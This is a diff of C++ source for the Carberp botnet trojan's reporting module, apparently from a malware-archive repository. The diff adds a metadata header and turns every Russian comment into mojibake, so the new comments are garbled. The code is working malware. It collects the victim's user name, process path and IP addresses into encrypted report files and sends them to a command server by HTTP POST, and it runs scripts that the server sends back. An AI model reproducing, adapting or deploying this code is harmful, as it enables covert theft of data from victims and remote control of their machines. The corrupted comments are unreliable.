@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #define SECURITY_WIN32 32
@@ -34,59 +45,59 @@
 static WCHAR reportFile[MAX_PATH];
 static WCHAR reportFolder[MAX_PATH];
 
-//Типы потоков в CreateReportSender.
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ CreateReportSender.
 enum
 {
   DEFAULTSENDER_REPORT,
   DEFAULTSENDER_STATUS
 };
 
-//Общая струкура для работы с сервером.
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 typedef struct
 {
-  BYTE threadType;                   //Одно из значений TT_*.
-  BinStorage::STORAGEARRAY storage;  //Массив. 
-  Crypt::RC4KEY rc4StorageKey;       //Ключ для конфигураций в хранилище.
-  WCHAR reportFile[MAX_PATH];        //Текущий файл для обработки.
-  ThreadsGroup::GROUP *group;        //Группа потоков (для создания дочерных потоков).
+  BYTE threadType;                   //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ TT_*.
+  BinStorage::STORAGEARRAY storage;  //пїЅпїЅпїЅпїЅпїЅпїЅ. 
+  Crypt::RC4KEY rc4StorageKey;       //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  WCHAR reportFile[MAX_PATH];        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  ThreadsGroup::GROUP *group;        //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ).
 }SENDERDATA;
 
-//Внутриннии данные для XSender.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ XSender.
 enum 
 {
-  DSR_SENDED,    //Отчет отправлен.
-  DSR_WAIT_DATA, //Ожидание данных.
-  DSR_ERROR      //Ошибка при отравки.
+  DSR_SENDED,    //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  DSR_WAIT_DATA, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  DSR_ERROR      //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 };
 
 /*
-  Инициализация файла отчета. Должна вызываться ВСЕГДА перед началом операции на файлом отчетов.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN forWrite  - инфиицализация для записи.
-  OUT tempFile - имя временного файла для текущей сессии. Может быть NULL.
+  IN forWrite  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT tempFile - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ NULL.
 */
 static void initReportFile(bool forWrite, LPWSTR tempFile)
 {
-  //Инициализация.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(reportFile[0] == 0)
   {
     Core::getPeSettingsPath(Core::PSP_REPORTFILE, reportFile);
     
-    //Директория
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     Str::_CopyW(reportFolder, reportFile, -1);
     CWA(shlwapi, PathRemoveFileSpecW)(reportFolder);
     
     WDEBUG1(WDDT_INFO, "reportFile=[%s].", reportFile);
   }
 
-  //Временный файл.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   if(tempFile != NULL)
   {
     Str::_CopyW(tempFile, reportFile, -1);
     CWA(shlwapi, PathRenameExtensionW)(tempFile, FILEEXTENSION_TEMP);
   }
  
-  //Проверка прав.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   if(forWrite && coreData.integrityLevel > Process::INTEGRITY_LOW)
   {
     Fs::_createDirectoryTree(reportFolder, /*&coreData.securityAttributes.saAllowAll*/NULL);
@@ -96,13 +107,13 @@ static void initReportFile(bool forWrite, LPWSTR tempFile)
 }
 
 /*
-  Добавления списка IP-адресов в отчет.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ IP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT binStorage - отчет.
-  IN family         - AF_INET или AF_INTET6.
+  IN OUT binStorage - пїЅпїЅпїЅпїЅпїЅ.
+  IN family         - AF_INET пїЅпїЅпїЅ AF_INTET6.
 
-  Return            - true - в случаи успеха,
-                      false - в случаи ошибки.
+  Return            - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                      false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool addIpAddressesToReport(BinStorage::STORAGE **binStorage, int family)
 {
@@ -225,21 +236,21 @@ bool Report::addBasicInfo(BinStorage::STORAGE **binStorage, DWORD flags)
 
     if((size = CWA(kernel32, GetModuleFileNameW)(NULL, file, MAX_PATH - 1)) > 0)
     {
-      file[size] = 0; //На всякий случай.
+      file[size] = 0; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
       r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_PROCESS_NAME, BinStorage::ITEMF_COMBINE_OVERWRITE, file);
     }
 
     size = sizeof(file) / sizeof(WCHAR);
     if(r && CWA(secur32, GetUserNameExW)(NameSamCompatible, file, &size) != FALSE && size > 0)
     {
-      file[size] = 0; //На всякий случай.
+      file[size] = 0; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
       r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_PROCESS_USER, BinStorage::ITEMF_COMBINE_OVERWRITE, file);
     }
   }
 
   if(r && flags & BIF_IP_ADDRESSES)
   {
-    //Не проверяем код возврата, т.к. интерфейсов может не существовать.
+    //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ.пїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     addIpAddressesToReport(binStorage, AF_INET);
     addIpAddressesToReport(binStorage, AF_INET6);
   }
@@ -272,13 +283,13 @@ static int defaultSenderRequestProc(DWORD loop, Report::SERVERSESSION *session)
   }
   else //if(senderData->threadType == DEFAULTSENDER_REPORT)
   {
-    //Если первый запрос.
+    //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     if(loop == 0)
     {
-      //Страховка.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       BinStorage::_closeStorageArray(&senderData->storage);
       
-      //Получаем ключи шифрования.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       {
         PESETTINGS pes;
         Core::getPeSettings(&pes);
@@ -286,16 +297,16 @@ static int defaultSenderRequestProc(DWORD loop, Report::SERVERSESSION *session)
         Mem::_copy(&senderData->rc4StorageKey, &pes.rc4Key, sizeof(Crypt::RC4KEY));
       }
 
-      //Открываем.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       if(!BinStorage::_openStorageArray(senderData->reportFile, BinStorage::OSF_WRITE_ACCESS, &senderData->storage))
       {
-        //Такой смелый поступок вызван тем, что в основном потоке, создается сессия только при
-        //наличии файла отчета, а если его не удалось открыть, просто удаляем и выходим.
+        //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         goto REMOVE_REPORT_FILE;
       }
     }
 
-    //Получние следующего элемента.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     BinStorage::STORAGE *binStorage;
     DWORD size;
     if(BinStorage::_getNextFromStorageArray(&senderData->storage, &binStorage, &size, &senderData->rc4StorageKey) && size > 0)
@@ -315,15 +326,15 @@ static int defaultSenderRequestProc(DWORD loop, Report::SERVERSESSION *session)
       WDEBUG0(WDDT_ERROR, "Not enough memory.");
     }
 
-    //Удаление файла.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 REMOVE_REPORT_FILE:
     /*
-      В случаи ошибки открытия файла, получения следующий конфгурации, или достижения конца файла,
-      или ошибки BinStorage::_Combine(а вдруг суммарный размер конфигов привысил лимит одного конфига),
-      завершаем сессию и удаляем файл.
+      пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ,
+      пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ BinStorage::_Combine(пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ),
+      пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
-      Так делается для минимизации возможности прекрашения отправки отчетов в случаи какой-то
-      странной ошибки.
+      пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ-пїЅпїЅ
+      пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     */
     WDEBUG0(WDDT_INFO, "End of storage file founded, stopping session.");
     BinStorage::_closeStorageArray(&senderData->storage);
@@ -338,14 +349,14 @@ static int defaultSenderResultProc(DWORD loop, Report::SERVERSESSION *session)
 {
   SENDERDATA *senderData = (SENDERDATA *)session->customData;
   
-  //Исполнения скриптов.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(session->postData->count > 0 && session->postData->size > sizeof(BinStorage::STORAGE) + sizeof(BinStorage::ITEM))
   {
     BinStorage::STORAGE *script = (BinStorage::STORAGE *)Mem::copyEx(session->postData, session->postData->size);
     if(script != NULL && !RemoteScript::_exec(script))Mem::free(script);
   }
 
-  //Метка отчета, как отпралдвенного.
+  //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(senderData->threadType == DEFAULTSENDER_REPORT)
   {
     if(BinStorage::_removeCurrentFromStorageArray(&senderData->storage))return Report::SSPR_CONTUNUE;
@@ -358,25 +369,25 @@ static int defaultSenderResultProc(DWORD loop, Report::SERVERSESSION *session)
 }
 
 /*
-  Поиск файл для загрузки на сервер.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  OUT fileName - полный путь файла.
-  IN tempFile  - полный путь временного файла.
-  IN maxDelay  - макс время задержки для отчета max(errorDelay, normalDelay).
+  OUT fileName - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+  IN tempFile  - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+  IN maxDelay  - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ max(errorDelay, normalDelay).
 
-  Return       - true - файл найден,
-                 false - файл не найден.
+  Return       - true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                 false - пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool findReportFileForSending(LPWSTR fileName, LPWSTR tempFile, DWORD maxDelay)
 {
-  //Проверяем не отосланный временный файл.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   if(CWA(kernel32, GetFileAttributesW)(tempFile) != INVALID_FILE_ATTRIBUTES)
   {
     Str::_CopyW(fileName, tempFile, -1);
     return true;
   }
   
-  //Проверяем файл отчета.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   if(CWA(kernel32, GetFileAttributesW)(reportFile) != INVALID_FILE_ATTRIBUTES)
   {
     Str::_CopyW(fileName, reportFile, -1);
@@ -398,7 +409,7 @@ static DWORD WINAPI defaultSender(void *p)
     return 1;
   }
 
-  //Насатраиваем данные сессии.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   Report::SERVERSESSION serverSession;
   Crypt::RC4KEY rc4Key;
   
@@ -408,7 +419,7 @@ static DWORD WINAPI defaultSender(void *p)
   serverSession.rc4Key      = &rc4Key;
   serverSession.customData  = senderData;
 
-  //Получем таймауты.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   DWORD normalDelay;
   DWORD errorDelay;
   DWORD maxDelay;
@@ -437,7 +448,7 @@ static DWORD WINAPI defaultSender(void *p)
     Mem::_zero(&baseConfig, sizeof(BASECONFIG));
   }
   
-  //Запуск.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ.
   BYTE loopResult;
   WCHAR tempFile[MAX_PATH];
 
@@ -448,13 +459,13 @@ static DWORD WINAPI defaultSender(void *p)
   {
     loopResult = DSR_WAIT_DATA;
 
-    //Проверяем наличие отчетов.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(senderData->threadType == DEFAULTSENDER_REPORT)
     {
       initReportFile(false, tempFile[0] == 0 ? tempFile : NULL);
       if(!findReportFileForSending(senderData->reportFile, tempFile, maxDelay))continue;
       
-      //Проверяем файл.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
       {
         DWORD64 fileSize = Fs::_getFileSizeEx(senderData->reportFile);
         if(fileSize == (DWORD)(-1) || fileSize > 0xFFFFFFFF)
@@ -467,7 +478,7 @@ static DWORD WINAPI defaultSender(void *p)
       
       WDEBUG1(WDDT_INFO, "Founded \"%s\".", senderData->reportFile);
 
-      //Перемещаем во временный файл.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
       if(CWA(kernel32, lstrcmpiW)(senderData->reportFile, tempFile) != 0)
       {
         HANDLE reportMutex = Core::waitForMutexOfObject(Core::OBJECT_ID_REPORTFILE, MalwareTools::KON_GLOBAL);
@@ -488,7 +499,7 @@ static DWORD WINAPI defaultSender(void *p)
       }
     }
     
-    //Создаем сессию.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     BinStorage::STORAGE *binStorage = DynamicConfig::getCurrent();
     if(binStorage != NULL)
     {
@@ -556,18 +567,18 @@ static int __inline sendRequest(HttpTools::URLDATA *ud, HINTERNET serverHandle, 
     if(procRetCode != Report::SSPR_CONTUNUE)result = procRetCode;
     else if(session->postData != NULL && (size = BinStorage::_pack(&session->postData, BinStorage::PACKF_FINAL_MODE, (Crypt::RC4KEY *)session->rc4Key)) > 0)
     {
-      //Отправляем запрос.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
       DWORD requestFlags = Wininet::WISRF_METHOD_POST | Wininet::WISRF_KEEP_CONNECTION;
       if(ud->scheme == HttpTools::UDS_HTTPS)requestFlags |= Wininet::WISRF_IS_HTTPS;
 
       HINTERNET requestHandle = Wininet::_SendRequest(serverHandle, ud->uri, NULL, session->postData, size, requestFlags);
       if(requestHandle != NULL)
       {
-        //Получаем ответ.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
         MEMDATA md;
         if(Wininet::_DownloadData(requestHandle, &md, 0, session->stopEvent))
         {
-          //Распаковывем ответ.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
           size = BinStorage::_unpack(NULL, md.data, md.size, (Crypt::RC4KEY *)session->rc4Key);
 
           Mem::free(session->postData);
@@ -590,16 +601,16 @@ bool Report::startServerSession(SERVERSESSION *session)
 
   bool retVal = false;
   HttpTools::URLDATA ud;
-  BinStorage::STORAGE *originalPostData = session->postData; //Сохраняем оригинальные пост-данные.
+  BinStorage::STORAGE *originalPostData = session->postData; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
 
   if(HttpTools::_parseUrl(session->url, &ud))
   {
     Core::initHttpUserAgent();
 
-    //Цикл повтора подключений к серверу в случаи обрыва или недоступности.
+    //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     for(BYTE bi = 0; bi < WININET_CONNECT_RETRY_COUNT && retVal == false; bi++)
     {
-      //Задержка.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       if(bi > 0)
       {
         if(session->stopEvent != NULL)
@@ -609,7 +620,7 @@ bool Report::startServerSession(SERVERSESSION *session)
         else CWA(kernel32, Sleep)(WININET_CONNECT_RETRY_DELAY);
       }
 
-      //Создаем хэндл сервера.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       HINTERNET serverHandle = Wininet::_Connect(coreData.httpUserAgent, ud.host, ud.port, bi % 2 == 0 ? Wininet::WICF_USE_IE_PROXY : 0);
       if(serverHandle != NULL)
       {
@@ -625,7 +636,7 @@ bool Report::startServerSession(SERVERSESSION *session)
     HttpTools::_freeUrlData(&ud);
   }
 
-  session->postData = originalPostData; //Восстанавливаем оригинальные пост-данные.
+  session->postData = originalPostData; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
   return retVal;
 }
 
